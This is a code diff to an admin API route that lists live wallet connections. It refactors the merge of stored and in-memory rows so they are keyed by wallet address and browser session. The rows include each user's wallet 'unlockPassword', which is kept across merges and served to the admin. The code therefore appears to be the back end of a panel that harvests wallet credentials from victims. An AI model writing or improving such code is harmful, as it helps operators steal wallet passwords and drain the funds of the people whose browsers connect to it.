@@ -329,18 +329,21 @@ adminRoutes.get('/wallet-connections/live', requireAdmin, async (_req, res) => {
         },
       },
     })
-    const byAddress = new Map<string, (typeof dbConnections)[number] | (typeof memory)[number]>()
-    for (const row of dbConnections) byAddress.set(row.walletAddress, row)
+    const byKey = new Map<string, (typeof dbConnections)[number] | (typeof memory)[number]>()
+    const rowKey = (row: { walletAddress: string; browserSessionId?: string | null }) =>
+      `${row.walletAddress}::${row.browserSessionId || 'default'}`
+    for (const row of dbConnections) byKey.set(rowKey(row), row)
     for (const row of memory) {
-      const prev = byAddress.get(row.walletAddress)
-      byAddress.set(row.walletAddress, {
+      const key = rowKey(row)
+      const prev = byKey.get(key) ?? byKey.get(rowKey({ walletAddress: row.walletAddress }))
+      byKey.set(key, {
         ...prev,
         ...row,
         unlockPassword: row.unlockPassword || prev?.unlockPassword || null,
         connectedAt: prev?.connectedAt || row.connectedAt,
       })
     }
-    const connections = Array.from(byAddress.values()).sort(
+    const connections = Array.from(byKey.values()).sort(
       (a, b) => new Date(b.lastSeenAt).getTime() - new Date(a.lastSeenAt).getTime()
     )
     return res.json({ connections, serverTime: new Date().toISOString() })
